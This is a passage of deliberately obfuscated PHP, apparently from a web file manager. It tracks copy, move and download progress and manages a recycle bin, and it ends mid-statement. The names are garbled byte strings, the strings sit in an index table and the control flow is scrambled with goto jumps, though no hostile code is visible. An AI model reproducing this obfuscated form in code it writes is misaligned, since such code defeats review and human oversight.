cÀ¸õºñÇœ; d‹©Ç‘ÅÌ¶: Hook::bind($B“ÁÊÑËª[1532], array($this, $B“ÁÊÑËª[1533])); Hook::bind($B“ÁÊÑËª[557], array($this, $B“ÁÊÑËª[1534])); $this->sourceModelCopyFlag = !1; goto F¢Ó®è‰´; aÍé¢áõÌÉ: $AæöË‡ë®Ï[$B“ÁÊÑËª[1541]] = LNG($B“ÁÊÑËª[1542]); $AæöË‡ë®Ï[$B“ÁÊÑËª[1543]] = 0; $AæöË‡ë®Ï[$B“ÁÊÑËª[1544]] = 0; goto EáæÊ‡¸Ã; fÑ…Ïä§õ: $AæöË‡ë®Ï[$B“ÁÊÑËª[1547]] = 0; $AæöË‡ë®Ï[$B“ÁÊÑËª[1548]] = 0; if (!$AæöË‡ë®Ï[$B“ÁÊÑËª[1403]]) { $AæöË‡ë®Ï[$B“ÁÊÑËª[1403]] = LNG($B“ÁÊÑËª[1549]); } goto A“äÇìãÃ§; C’ÔÅÊ«°å: Hook::bind($B“ÁÊÑËª[1523], array($this, $B“ÁÊÑËª[1524])); Hook::bind($B“ÁÊÑËª[1084], array($this, $B“ÁÊÑËª[1525])); Hook::bind($B“ÁÊÑËª[1526], array($this, $B“ÁÊÑËª[1527])); goto aÅ¾±ô¨Ò­; aÅ¾±ô¨Ò­: Hook::bind($B“ÁÊÑËª[564], array($this, $B“ÁÊÑËª[1528])); Hook::bind($B“ÁÊÑËª[565], array($this, $B“ÁÊÑËª[1529])); Hook::bind($B“ÁÊÑËª[567], array($this, $B“ÁÊÑËª[1530])); goto d‚Æ¬İ—âÃ; C™Ëñ ÂÂÚ: $B“ÁÊÑËª =& $_SERVER[¢ÌÛ]; $AæöË‡ë®Ï =& $this->task; $this->sourceCopyFolder = !1; goto C’ÔÅÊ«°å; EáæÊ‡¸Ã: $AæöË‡ë®Ï[$B“ÁÊÑËª[1000]] = $B“ÁÊÑËª[33]; $AæöË‡ë®Ï[$B“ÁÊÑËª[1545]] = $B“ÁÊÑËª[33]; $AæöË‡ë®Ï[$B“ÁÊÑËª[1546]] = 0; goto fÑ…Ïä§õ; A“äÇìãÃ§: } protected function endAfter() { goto a­ØõÒæ£; BÚ°Şò™ÒŒ: Hook::unbind($BìòÛàÏÇ[1526], array($this, $BìòÛàÏÇ[1527])); Hook::unbind($BìòÛàÏÇ[564], array($this, $BìòÛàÏÇ[1528])); Hook::unbind($BìòÛàÏÇ[565], array($this, $BìòÛàÏÇ[1529])); goto aô…©ÂÚƒ; fÛŠ ÖŒ º: Hook::unbind($BìòÛàÏÇ[541], array($this, $BìòÛàÏÇ[1531])); Hook::unbind($BìòÛàÏÇ[1532], array($this, $BìòÛàÏÇ[1533])); Hook::unbind($BìòÛàÏÇ[557], array($this, $BìòÛàÏÇ[1534])); goto b‰Ğ°åßÍ; a­ØõÒæ£: $BìòÛàÏÇ =& $_SERVER[¢ÌÛ]; Hook::unbind($BìòÛàÏÇ[1523], array($this, $BìòÛàÏÇ[1524])); Hook::unbind($BìòÛàÏÇ[1084], array($this, $BìòÛàÏÇ[1525])); goto BÚ°Şò™ÒŒ; aô…©ÂÚƒ: Hook::unbind($BìòÛàÏÇ[567], array($this, $BìòÛàÏÇ[1530])); Hook::unbind($BìòÛàÏÇ[568], array($this, $BìòÛàÏÇ[1530])); Hook::unbind($BìòÛàÏÇ[535], array($this, $BìòÛàÏÇ[1531])); goto föóÈÈè»Ú; föóÈÈè»Ú: Hook::unbind($BìòÛàÏÇ[532], array($this, $BìòÛàÏÇ[1531])); Hook::unbind($BìòÛàÏÇ[537], array($this, $BìòÛàÏÇ[1531])); Hook::unbind($BìòÛàÏÇ[539], array($this, $BìòÛàÏÇ[1531])); goto fÛŠ ÖŒ º; b‰Ğ°åßÍ: Hook::unbind($BìòÛàÏÇ[1535], array($this, $BìòÛàÏÇ[1536])); Hook::unbind($BìòÛàÏÇ[1537], array($this, $BìòÛàÏÇ[1538])); Hook::unbind($BìòÛàÏÇ[1539], array($this, $BìòÛàÏÇ[1540])); goto bÛÁ¦êìÚì; bÛÁ¦êìÚì: } public function copyMoveStart($Fó›Ê¨ŠÚ, $b¾‡äò…, $f÷›‰ãŒçØ, $FãÂåˆè™ß) { goto a±—âÉÈ•™; CŸ˜»î”’: $B¥ Àç»¬Å[$DÏŒ„…Ñ–ˆ[1551]] = KodIO::transferType($Fó›Ê¨ŠÚ, $f÷›‰ãŒçØ); $this->update(); goto aç¨ƒº°»µ; a±—âÉÈ•™: $DÏŒ„…Ñ–ˆ =& $_SERVER[¢ÌÛ]; self::log($DÏŒ„…Ñ–ˆ[1550] . $b¾‡äò… . $DÏŒ„…Ñ–ˆ[66] . $FãÂåˆè™ß); $C‰éªÛôî— = rtrim(TEMP_FILES, $DÏŒ„…Ñ–ˆ[8]); goto EÇ‰µÔâ©Ğ; EÇ‰µÔâ©Ğ: if (substr($b¾‡äò…, 0, strlen($C‰éªÛôî—)) == $C‰éªÛôî—) { return; } if (substr($FãÂåˆè™ß, 0, strlen($C‰éªÛôî—)) == $C‰éªÛôî—) { return; } $B¥ Àç»¬Å =& $this->task; goto CŸ˜»î”’; aç¨ƒº°»µ: } public function updateAfter() { goto b§Èëµ¿²Œ; f‡Ğˆ³Ü–: $A£±™Şğ·[$Eª¤µ°‰¸…[1499]] = $A£±™Şğ·[$Eª¤µ°‰¸…[1548]] / $A£±™Şğ·[$Eª¤µ°‰¸…[721]]; if ($A£±™Şğ·[$Eª¤µ°‰¸…[1499]] > 0) { $Eà‘šÔëÚ = timeFloat() - $A£±™Şğ·[$Eª¤µ°‰¸…[1501]] - $A£±™Şğ·[$Eª¤µ°‰¸…[1504]]; $A£±™Şğ·[$Eª¤µ°‰¸…[1505]] = $Eà‘šÔëÚ * (1 - $A£±™Şğ·[$Eª¤µ°‰¸…[1499]]) / $A£±™Şğ·[$Eª¤µ°‰¸…[1499]]; } goto BÂ×ğ‘òÍ¥; b§Èëµ¿²Œ: $Eª¤µ°‰¸… =& $_SERVER[¢ÌÛ]; $A£±™Şğ· =& $this->task; if (!$A£±™Şğ·[$Eª¤µ°‰¸…[721]]) { return; } goto a¬­º‹²¤‚; a¬­º‹²¤‚: if ($this->sourceModelCopyFlag) { return; } if ($A£±™Şğ·[$Eª¤µ°‰¸…[1551]] == $Eª¤µ°‰¸…[1155]) { return; } if ($A£±™Şğ·[$Eª¤µ°‰¸…[1551]] == $Eª¤µ°‰¸…[1070] || $A£±™Şğ·[$Eª¤µ°‰¸…[1551]] == $Eª¤µ°‰¸…[106]) { if ($A£±™Şğ·[$Eª¤µ°‰¸…[1545]]) { $A£±™Şğ·[$Eª¤µ°‰¸…[1548]] = $A£±™Şğ·[$Eª¤µ°‰¸…[1547]] + $A£±™Şğ·[$Eª¤µ°‰¸…[1544]]; } } else { if ($A£±™Şğ·[$Eª¤µ°‰¸…[1551]] == $Eª¤µ°‰¸…[1156]) { if ($A£±™Şğ·[$Eª¤µ°‰¸…[1545]] == $Eª¤µ°‰¸…[1070]) { $A£±™Şğ·[$Eª¤µ°‰¸…[1548]] = $A£±™Şğ·[$Eª¤µ°‰¸…[1547]] + $A£±™Şğ·[$Eª¤µ°‰¸…[1544]] * 0.5; } else { if ($A£±™Şğ·[$Eª¤µ°‰¸…[1545]] == $Eª¤µ°‰¸…[106]) { $A£±™Şğ·[$Eª¤µ°‰¸…[1548]] = $A£±™Şğ·[$Eª¤µ°‰¸…[1547]] + $A£±™Şğ·[$Eª¤µ°‰¸…[1543]] * 0.5 + $A£±™Şğ·[$Eª¤µ°‰¸…[1544]] * 0.5; } } } } goto f‡Ğˆ³Ü–; BÂ×ğ‘òÍ¥: } public function addPath($DŒÓÌŒÃâ) { goto câƒ¾ù­•¶; cø¡ŞÎğƒÕ: $cš¯’¶œ‡¡ = IO::infoWithChildren($DŒÓÌŒÃâ); $aì·…‹ë = $C¤œ²ÓØ°—[$B§ñË ”¸[1552]] ? $C¤œ²ÓØ°—[$B§ñË ”¸[1552]][$B§ñË ”¸[1553]] : 0; $C¤œ²ÓØ°—[$B§ñË ”¸[1552]] = array($B§ñË ”¸[1553] => $aì·…‹ë + 1, $B§ñË ”¸[413] => $cš¯’¶œ‡¡[$B§ñË ”¸[28]], $B§ñË ”¸[75] => $cš¯’¶œ‡¡[$B§ñË ”¸[75]], $B§ñË ”¸[493] => $cš¯’¶œ‡¡[$B§ñË ”¸[493]] ? $cš¯’¶œ‡¡[$B§ñË ”¸[493]] : $cš¯’¶œ‡¡[$B§ñË ”¸[75]]); goto aÉæªŸÔ¡Í; câƒ¾ù­•¶: $B§ñË ”¸ =& $_SERVER[¢ÌÛ]; if (!$DŒÓÌŒÃâ) { return; } $C¤œ²ÓØ°— =& $this->task; goto cø¡ŞÎğƒÕ; aÉæªŸÔ¡Í: if ($cš¯’¶œ‡¡[$B§ñË ”¸[29]] == $B§ñË ”¸[173]) { $C¤œ²ÓØ°—[$B§ñË ”¸[998]] += 1; } else { $C¤œ²ÓØ°—[$B§ñË ”¸[998]] += $cš¯’¶œ‡¡[$B§ñË ”¸[80]][$B§ñË ”¸[78]]; if ($cš¯’¶œ‡¡[$B§ñË ”¸[396]]) { $C¤œ²ÓØ°—[$B§ñË ”¸[998]] += $cš¯’¶œ‡¡[$B§ñË ”¸[80]][$B§ñË ”¸[79]] + 1; } } $C¤œ²ÓØ°—[$B§ñË ”¸[721]] += $cš¯’¶œ‡¡[$B§ñË ”¸[77]]; $this->update(); goto d¨¶ˆÎÛ‚; d¨¶ˆÎÛ‚: } public function sourceCopyFolderStart() { $this->sourceCopyFolder = !0; } public function sourceCopyFolderEnd() { $this->sourceCopyFolder = !1; } public function sourceAddFile($f­±Áã¹Ü) { $eêÖ¡á„äƒ =& $_SERVER[¢ÌÛ]; $bÆ¬ÛÅÖ¼Á =& $this->task; $bÆ¬ÛÅÖ¼Á[$eêÖ¡á„äƒ[1541]] = $f­±Áã¹Ü[$eêÖ¡á„äƒ[28]]; $bÆ¬ÛÅÖ¼Á[$eêÖ¡á„äƒ[1000]] = $f­±Áã¹Ü[$eêÖ¡á„äƒ[28]]; $this->update(); } public function copyFileStart($aà—ÎŞ¶–, $CñÕŒìÌ®Ÿ, $bí¶†Ôš‘î, $eÌÚ³ÃŞ•Ø, $bÀ¡†ëÇÜÉ, $E·¡”§ÀÍ›) { goto dÉÉß®¾Ëª; b‡ÔÀõø: $BŸ×ñ’ºíŒ[$dÃ»áÕ¢—Ô[1000]] = $dÃ»áÕ¢—Ô[33]; $BŸ×ñ’ºíŒ[$dÃ»áÕ¢—Ô[1545]] = $dÃ»áÕ¢—Ô[33]; $BŸ×ñ’ºíŒ[$dÃ»áÕ¢—Ô[1546]] = 0; goto Aš§ÇÍÔ‚; dÉÉß®¾Ëª: $dÃ»áÕ¢—Ô =& $_SERVER[¢ÌÛ]; $e×öÎôÄ‹… = $bÀ¡†ëÇÜÉ; if ($e×öÎôÄ‹… == $GLOBALS[$dÃ»áÕ¢—Ô[1554]]) { $e×öÎôÄ‹… = $GLOBALS[$dÃ»áÕ¢—Ô[1555]]; } goto bÔ®¤äøªæ; Aš§ÇÍÔ‚: $this->update(); goto e‡½æë°„¨; bÔ®¤äøªæ: $GLOBALS[$dÃ»áÕ¢—Ô[1555]] = $bÀ¡†ëÇÜÉ; $GLOBALS[$dÃ»áÕ¢—Ô[1554]] = $E·¡”§ÀÍ›; $BŸ×ñ’ºíŒ =& $this->task; goto a®ªÕÒ°‚; a®ªÕÒ°‚: $BŸ×ñ’ºíŒ[$dÃ»áÕ¢—Ô[1541]] = $e×öÎôÄ‹…; $BŸ×ñ’ºíŒ[$dÃ»áÕ¢—Ô[1543]] = (int) $aà—ÎŞ¶–->size($CñÕŒìÌ®Ÿ); $BŸ×ñ’ºíŒ[$dÃ»áÕ¢—Ô[1544]] = 0; goto b‡ÔÀõø; e‡½æë°„¨: } public function copyFileEnd($E­®¸ÆçÕ», $E°ìò¨É˜, $FÄëØåëï…, $däåœÓ½èŠ, $E¯¥„†¸º, $F·¡µ±Ü¾ï) { $dªÃĞÉå§ =& $_SERVER[¢ÌÛ]; $cÊ•¦ŞÃ°Ï =& $this->task; $cÊ•¦ŞÃ°Ï[$dªÃĞÉå§[1544]] = $cÊ•¦ŞÃ°Ï[$dªÃĞÉå§[1543]]; $cÊ•¦ŞÃ°Ï[$dªÃĞÉå§[1545]] = $dªÃĞÉå§[33]; if ($E¯¥„†¸º == $cÊ•¦ŞÃ°Ï[$dªÃĞÉå§[1541]]) { $cÊ•¦ŞÃ°Ï[$dªÃĞÉå§[1547]] += $cÊ•¦ŞÃ°Ï[$dªÃĞÉå§[1543]]; $cÊ•¦ŞÃ°Ï[$dªÃĞÉå§[1548]] = $cÊ•¦ŞÃ°Ï[$dªÃĞÉå§[1547]]; $this->update(1); } else { $this->update(); $cÊ•¦ŞÃ°Ï[$dªÃĞÉå§[1544]] = 0; } self::log($dªÃĞÉå§[1556] . $E°ìò¨É˜ . $dªÃĞÉå§[66] . $däåœÓ½èŠ . $dªÃĞÉå§[227] . $E¯¥„†¸º . $dªÃĞÉå§[1557] . $cÊ•¦ŞÃ°Ï[$dªÃĞÉå§[1541]]); } public function updateFileEnd($FâÏ¤‚·æ, $eÇ‡ïƒŠÕ) { goto DÚ¨¦º´°Ä; Fõæñå‰²: $cà±ÖÅÒ¾Ş[$AÏõë„„ò[1543]] = $eÇ‡ïƒŠÕ; $cà±ÖÅÒ¾Ş[$AÏõë„„ò[1547]] += $eÇ‡ïƒŠÕ; $cà±ÖÅÒ¾Ş[$AÏõë„„ò[1548]] = $cà±ÖÅÒ¾Ş[$AÏõë„„ò[1547]]; goto aãáŸŒçŒ«; aãáŸŒçŒ«: $this->update(1); self::log($AÏõë„„ò[1558] . $FâÏ¤‚·æ); goto B¬äÕ¶¸¥ƒ; DÚ¨¦º´°Ä: $AÏõë„„ò =& $_SERVER[¢ÌÛ]; $cà±ÖÅÒ¾Ş =& $this->task; $cà±ÖÅÒ¾Ş[$AÏõë„„ò[1541]] = $FâÏ¤‚·æ; goto Fõæñå‰²; B¬äÕ¶¸¥ƒ: } public function sourceModelCopy($EÆåìÌ›¿) { goto e¥æ±©éÊÛ; DÒöÎ’”è“: $C‡½÷®ÎÖ =& $this->task; $this->sourceModelCopyFlag = !0; $bßùœ”È¾® = 0; goto e“…îÚ…ä; e“…îÚ…ä: switch ($cŞåÁâÉåè) { case $CŠ½…¤´‹á[533]: $bßùœ”È¾® = 1; break; case $CŠ½…¤´‹á[536]: $C‡½÷®ÎÖ[$CŠ½…¤´‹á[1541]] = $eíöæ„‘Ò[$CŠ½…¤´‹á[28]]; break; case $CŠ½…¤´‹á[538]: $bßùœ”È¾® = intval($EÆåìÌ›¿[$CŠ½…¤´‹á[372]] * 0.4); break; case $CŠ½…¤´‹á[540]: $bßùœ”È¾® = intval($EÆåìÌ›¿[$CŠ½…¤´‹á[372]] * 0.2); break; case $CŠ½…¤´‹á[542]: $bßùœ”È¾® = intval($EÆåìÌ›¿[$CŠ½…¤´‹á[372]] * 0.4); break; } $this->update($bßùœ”È¾®); $this->sourceModelCopyFlag = !1; goto C„…ƒÜÃÀÔ; e¥æ±©éÊÛ: $CŠ½…¤´‹á =& $_SERVER[¢ÌÛ]; $cŞåÁâÉåè = $EÆåìÌ›¿[0]; $eíöæ„‘Ò = $EÆåìÌ›¿[1]; goto DÒöÎ’”è“; C„…ƒÜÃÀÔ: } public function sourceRemove($CŸÃÕŒº“, $b¸·½‡ÇÅŸ) { $DªŒÚî‚‹ =& $_SERVER[¢ÌÛ]; $this->sourceModelCopyFlag = !0; $Fó©âÈöç“ = 1; if (isset($CŸÃÕŒº“[$DªŒÚî‚‹[80]])) { $Fó©âÈöç“ = $CŸÃÕŒº“[$DªŒÚî‚‹[80]][$DªŒÚî‚‹[78]] + $CŸÃÕŒº“[$DªŒÚî‚‹[80]][$DªŒÚî‚‹[79]] + 1; } $this->update($Fó©âÈöç“); $this->sourceModelCopyFlag = !1; } public function sourceMove($CÁ¦Äíµìî) { $this->sourceRemove($CÁ¦Äíµìî, !1); } public function curlProgress($EÌÍçŒÔ«©, $CÛ¢»ÅÓë“, $a†Á§İÍÀš, $bË‡™Šâ‡‡, $bÌçÖƒíÖ¶) { $c·ê‡ĞùÍ =& $_SERVER[¢ÌÛ]; $f‚ÕÉˆŒôé =& $this->task; if ($bÌçÖƒíÖ¶ > 0) { $f‚ÕÉˆŒôé[$c·ê‡ĞùÍ[1000]] = $c·ê‡ĞùÍ[1559]; $f‚ÕÉˆŒôé[$c·ê‡ĞùÍ[1545]] = $c·ê‡ĞùÍ[106]; if ($f‚ÕÉˆŒôé[$c·ê‡ĞùÍ[1543]]) { $f‚ÕÉˆŒôé[$c·ê‡ĞùÍ[1544]] = $bÌçÖƒíÖ¶; } if ($f‚ÕÉˆŒôé[$c·ê‡ĞùÍ[1546]]) { $f‚ÕÉˆŒôé[$c·ê‡ĞùÍ[1544]] = $bÌçÖƒíÖ¶ + $f‚ÕÉˆŒôé[$c·ê‡ĞùÍ[1546]]; } } else { if ($a†Á§İÍÀš > 0) { if ($f‚ÕÉˆŒôé[$c·ê‡ĞùÍ[1543]] == $CÛ¢»ÅÓë“) { $f‚ÕÉˆŒôé[$c·ê‡ĞùÍ[1544]] = $a†Á§İÍÀš; $f‚ÕÉˆŒôé[$c·ê‡ĞùÍ[1000]] = $c·ê‡ĞùÍ[1560]; $f‚ÕÉˆŒôé[$c·ê‡ĞùÍ[1545]] = $c·ê‡ĞùÍ[1070]; } } } $this->update(); } public function curlProgressStart($bğîÆ…ğŒª) { } public function curlProgressEnd($dîŞêŞ¸¼…) { goto B¾éä·®Ò; B–’Öøğ…Ñ: $this->update(); goto Cáˆ‹­›µÉ; Fº¬éù¼™ß: $Bò¿«ğ†‚ = $A’Ÿ…èŠ¹[$E´Š¹æóµ°[1561]]; if ($Bò¿«ğ†‚ == -1) { $Bò¿«ğ†‚ = $A’Ÿ…èŠ¹[$E´Š¹æóµ°[1562]]; } if ($f‚İµ–¢Ì¢[$E´Š¹æóµ°[1545]] == $E´Š¹æóµ°[106] && $Bò¿«ğ†‚) { $f‚İµ–¢Ì¢[$E´Š¹æóµ°[1546]] += $Bò¿«ğ†‚; } goto B–’Öøğ…Ñ; B¾éä·®Ò: $E´Š¹æóµ° =& $_SERVER[¢ÌÛ]; $f‚İµ–¢Ì¢ =& $this->task; $A’Ÿ…èŠ¹ = curl_getinfo($dîŞêŞ¸¼…); goto Fº¬éù¼™ß; Cáˆ‹­›µÉ: } } class TaskHttp extends Task { protected function startAfter() { $AèÌÆ¦á– =& $_SERVER[¢ÌÛ]; $a¤Ñ®Ø¹ÍÖ =& $this->task; $a¤Ñ®Ø¹ÍÖ[$AèÌÆ¦á–[1563]] = 1; Hook::bind($AèÌÆ¦á–[1535], array($this, $AèÌÆ¦á–[1564])); Hook::bind($AèÌÆ¦á–[1537], array($this, $AèÌÆ¦á–[1565])); Hook::bind($AèÌÆ¦á–[1539], array($this, $AèÌÆ¦á–[1566])); } protected function endAfter() { $D¢¹Ë„Ú…ª =& $_SERVER[¢ÌÛ]; Hook::unbind($D¢¹Ë„Ú…ª[1535], array($this, $D¢¹Ë„Ú…ª[1564])); Hook::unbind($D¢¹Ë„Ú…ª[1537], array($this, $D¢¹Ë„Ú…ª[1565])); Hook::unbind($D¢¹Ë„Ú…ª[1539], array($this, $D¢¹Ë„Ú…ª[1566])); } public function progressStart($CÏÃøãª´Ç) { $cÉ¿†Ó·Š  =& $_SERVER[¢ÌÛ]; $E×­…Íê¹ = curl_getinfo($CÏÃøãª´Ç); self::log($cÉ¿†Ó·Š [1567] . $E×­…Íê¹[$cÉ¿†Ó·Š [303]]); self::valueSet($this->task[$cÉ¿†Ó·Š [385]], $this->task); } public function progressEnd($fÛ­Íâ¤¤ó) { $Aš ÆÅÂëå =& $_SERVER[¢ÌÛ]; self::log($Aš ÆÅÂëå[1568] . $this->task[$Aš ÆÅÂëå[385]]); $this->end(); } public function progress($BŠÇÕà™È, $E°×Â­¯Æ¤, $AåŸäˆ‚Á², $AŸ’åï‚, $FŒ±ÜÃ¤Ïå) { $B«°Å˜´Ó =& $_SERVER[¢ÌÛ]; $Dì©˜Ï»ÖÀ =& $this->task; if ($FŒ±ÜÃ¤Ïå > 0) { $Dì©˜Ï»ÖÀ[$B«°Å˜´Ó[998]] = $Dì©˜Ï»ÖÀ[$B«°Å˜´Ó[998]] == 0 ? $AŸ’åï‚ : $Dì©˜Ï»ÖÀ[$B«°Å˜´Ó[998]]; $Dì©˜Ï»ÖÀ[$B«°Å˜´Ó[1012]] = $FŒ±ÜÃ¤Ïå; } else { if ($AåŸäˆ‚Á² > 0) { $Dì©˜Ï»ÖÀ[$B«°Å˜´Ó[998]] = $Dì©˜Ï»ÖÀ[$B«°Å˜´Ó[998]] == 0 ? $E°×Â­¯Æ¤ : $Dì©˜Ï»ÖÀ[$B«°Å˜´Ó[998]]; $Dì©˜Ï»ÖÀ[$B«°Å˜´Ó[1012]] = $AåŸäˆ‚Á²; } } $this->update(); self::log("\160\x72\x6f\x67\x72\x65\163\x73\110\x74\164\160\x3a\144\x6f\x77\x6e\72{$AåŸäˆ‚Á²}\57{$E°×Â­¯Æ¤}\73\40\165\160\154\x6f\x61\144\72{$FŒ±ÜÃ¤Ïå}\x2f{$AŸ’åï‚}\73"); } } goto cîËÂœâŸö; e··–Šî„: class SourceRecycleModel extends ModelBase { protected $tableName = "\x69\157\137\x73\x6f\165\x72\143\145\137\x72\145\x63\171\143\x6c\145"; protected $dataAuto = array(array("\x63\162\x65\141\x74\145\x54\x69\x6d\145", "\164\x69\x6d\x65", "\151\x6e\163\145\x72\164", "\x66\x75\156\x63\x74\x69\157\x6e")); public function listData($A±§ï‰êÉ = false) { $a®‘ƒ‚îÛ =& $_SERVER[¢ÌÛ]; $A±§ï‰êÉ = $A±§ï‰êÉ ? $A±§ï‰êÉ : USER_ID; $a†ë”–º‘ß = $this->where(array($a®‘ƒ‚îÛ[1490] => $A±§ï‰êÉ))->select(); return array_to_keyvalue($a†ë”–º‘ß, $a®‘ƒ‚îÛ[33], $a®‘ƒ‚îÛ[396]); } public function moveToRecycle($Cˆ«ìŸ’) { goto DŠß³”ôŒ‘; DŠß³”ôŒ‘: $CïÀ¡‰ˆğ =& $_SERVER[¢ÌÛ]; $Bè¥²£ºù· = Model($CïÀ¡‰ˆğ[1178]); $aÓôµŸÁæò = $Bè¥²£ºù·->sourceInfo($Cˆ«ìŸ’); goto BÁˆƒ®‚„¶; f¥Óª»„ƒ¥: $this->recycleMove($Cˆ«ìŸ’, 1); if ($aÓôµŸÁæò[$CïÀ¡‰ˆğ[397]] == $CïÀ¡‰ˆğ[86]) { $B ´Ÿã¯Åö = array($CïÀ¡‰ˆğ[551] => array($CïÀ¡‰ˆğ[510], $aÓôµŸÁæò[$CïÀ¡‰ˆğ[486]] . $Cˆ«ìŸ’ . $CïÀ¡‰ˆğ[511])); $Bè¥²£ºù·->where($B ´Ÿã¯Åö)->setField($CïÀ¡‰ˆğ[423], 1); } goto D‹Å·“±Öê; BÁˆƒ®‚„¶: if (!$aÓôµŸÁæò || $aÓôµŸÁæò[$CïÀ¡‰ˆğ[423]] == $CïÀ¡‰ˆğ[86]) { return; } $C¢ê‹‡×´­ = array($CïÀ¡‰ˆğ[410] => $Cˆ«ìŸ’, $CïÀ¡‰ˆğ[1490] => USER_ID, $CïÀ¡‰ˆğ[547] => $aÓôµŸÁæò[$CïÀ¡‰ˆğ[398]], $CïÀ¡‰ˆğ[548] => $aÓôµŸÁæò[$CïÀ¡‰ˆğ[483]], $CïÀ¡‰ˆğ[551] => $aÓôµŸÁæò[$CïÀ¡‰ˆğ[486]]); $this->add($C¢ê‹‡×´­); goto f¥Óª»„ƒ¥; D‹Å·“±Öê: } public function clear() { $this->remove(!1); } public function remove($C‘ôíïâï = false) { goto fç×ÂñÌ…Ö; fç×ÂñÌ…Ö: $A°ÅŠÕ¢™ =& $_SERVER[¢ÌÛ]; $D—’ƒÑ‹Ğã = Model($A°ÅŠÕ¢™[1178]); $f‘Ä„ŸÈÅˆ = $this->listData(); goto dÄÚœ„¥; dÄÚœ„¥: $C‘ôíïâï = $C‘ôíïâï === !1 ? !1 : $C‘ôíïâï; $Dõ™Äì˜ = array(); foreach ($f‘Ä„ŸÈÅˆ as $FŠì«ƒõÉ) { if ($C‘ôíïâï != !1 && !in_array($FŠì«ƒõÉ, $C‘ôíïâï)) { continue; } $aˆ›ô’Åõô = $D—’ƒÑ‹Ğã->sourceInfo($FŠì«ƒõÉ); $D—’ƒÑ‹Ğã->remove($FŠì«ƒõÉ, !1); $BÇ®×Ş†¯ = $aˆ›ô’Åõô[$A°ÅŠÕ¢™[398]] . $A°ÅŠÕ¢™[70] . $aˆ›ô’Åõô[$A°ÅŠÕ¢™[483]]; $Dõ™Äì˜[$BÇ®×Ş†¯] = array($A°ÅŠÕ¢™[547] => $aˆ›ô’Åõô[$A°ÅŠÕ¢™[398]], $A°ÅŠÕ¢™[483] => $aˆ›ô’Åõô[$A°ÅŠÕ¢™[483]]); $this->where(array($A°ÅŠÕ¢™[396] => $FŠì«ƒõÉ))->delete(); } goto cŸÕ®ßç®Æ; cŸÕ®ßç®Æ: foreach ($Dõ™Äì˜ as $cåÚº£«µ) { $D—’ƒÑ‹Ğã->targetSpaceUpdate($cåÚº£«µ[$A°ÅŠÕ¢™[398]], $cåÚº£«µ[$A°ÅŠÕ¢™[483]]); } goto a÷ÁŸ•óÚ; a÷ÁŸ•óÚ: } public function restore($e©‘À¦Ëä˜ = false) { goto DÓ†­£ôÁÔ; ağ¤ùºÎ±: $e©‘À¦Ëä˜ = $e©‘À¦Ëä˜ == !1 ? !1 : $e©‘À¦Ëä˜; if (!$dé¸»±ÒÊÙ) { return !0; } $câ¥Ğé¤—… = array(); goto BÖµÉó£ç¬; DÓ†­£ôÁÔ: $bâÆƒĞÙ÷¬ =& $_SERVER[¢ÌÛ]; $d’âˆ‚ñÌ· = Model($bâÆƒĞÙ÷¬[1178]); $dé¸»±ÒÊÙ = $this->listData(); goto ağ¤ùºÎ±; BÖµÉó£ç¬: foreach ($dé¸»±ÒÊÙ as $dåÌô’–‡) { goto câæ±Â¨•ğ; CæªÄÔÄÌë: if ($f´ãÅ˜–á×[$bâÆƒĞÙ÷¬[397]] == $bâÆƒĞÙ÷¬[86]) { $C„¯¡ä§¢÷ = array($bâÆƒĞÙ÷¬[551] => array($bâÆƒĞÙ÷¬[510], $f´ãÅ˜–á×[$bâÆƒĞÙ÷¬[486]] . $dåÌô’–‡ . $bâÆƒĞÙ÷¬[511])); $d’âˆ‚ñÌ·->where($C„¯¡ä§¢÷)->setField($bâÆƒĞÙ÷¬[423], 0); $this->restoreFolderChildren($dåÌô’–‡, $dé¸»±ÒÊÙ); } $this->where(array($bâÆƒĞÙ÷¬[396] => $dåÌô’–‡))->delete(); $d’âˆ‚ñÌ·->folderSizeReset($f´ãÅ˜–á×[$bâÆƒĞÙ÷¬[488]]); goto DòñŞíŸóš; câæ±Â¨•ğ: if ($e©‘À¦Ëä˜ != !1 && !in_array($dåÌô’–‡, $e©‘À¦Ëä˜)) { continue; } $f´ãÅ˜–á× = $d’âˆ‚ñÌ·->sourceInfo($dåÌô’–‡); $C¾±˜›÷È‚ = $d’âˆ‚ñÌ·->sourceInfo($f´ãÅ˜–á×[$bâÆƒĞÙ÷¬[488]]); goto FÅ Ê˜Ü‚; DòñŞíŸóš: $câ¥Ğé¤—…[] = $f´ãÅ˜–á×[$bâÆƒĞÙ÷¬[488]]; if ($f´ãÅ˜–á×[$bâÆƒĞÙ÷¬[397]] == $bâÆƒĞÙ÷¬[86]) { $câ¥Ğé¤—…[] = $dåÌô’–‡; } $d’âˆ‚ñÌ·->lockMoveEnd($dåÌô’–‡); goto a”¸»‚ù’; FÅ Ê˜Ü‚: if ($C¾±˜›÷È‚[$bâÆƒĞÙ÷¬[423]] == $bâÆƒĞÙ÷¬[86]) { continue; } $d’âˆ‚ñÌ·->lockMoveStart($dåÌô’–‡); $this->recycleMove($dåÌô’–‡, 0); goto CæªÄÔÄÌë; a”¸»‚ù’: } $d’âˆ‚ñÌ·->updateModifyTime($câ¥Ğé¤—…); goto dÂ¾é„ªå; dÂ¾é„ªå: } private function restoreFolderChildren($f¬ªïãÇË, $D¦İŒ±ÈŸ) { goto bâç‰óËáî; aœÔ«ÇÈÛÎ: foreach ($D¦İŒ±ÈŸ as $fŞ†íË”Ó¡) { if ($fŞ†íË”Ó¡ == $f¬ªïãÇË) { continue; } if (!$aÈëƒïÀ¬«->isParentOf($f¬ªïãÇË, $fŞ†íË”Ó¡)) { continue; } $a¶£Â‡å = $aÈëƒïÀ¬«->sourceInfo($fŞ†íË”Ó¡); if ($a¶£Â‡å[$Fù·§°É«[397]] == $Fù·§°É«[86]) { $AïíÖÑÍƒ°[] = array($Fù·§°É«[551] => array($Fù·§°É«[510], $a¶£Â‡å[$Fù·§°É«[486]] . $fŞ†íË”Ó¡ . $Fù·§°É«[511])); } else { $AïíÖÑÍƒ°[$Fù·§°É«[396]][1][] = $fŞ†íË”Ó¡; } } if (!$AïíÖÑÍƒ°[$Fù·§°É«[396]][1]) { unset($AïíÖÑÍƒ°[$Fù·§°É«[396]]); } if (!$AïíÖÑÍƒ°) { return; } goto aìëÍÑ´Ÿ; aìëÍÑ´Ÿ: $AïíÖÑÍƒ°[$Fù·§°É«[396]][1] = array_unique($AïíÖÑÍƒ°[$Fù·§°É«[396]][1]); $AïíÖÑÍƒ°[$Fù·§°É«[934]] = $Fù·§°É«[1746]; $aÈëƒïÀ¬«->where($AïíÖÑÍƒ°)->setField($Fù·§°É«[423], 1); goto 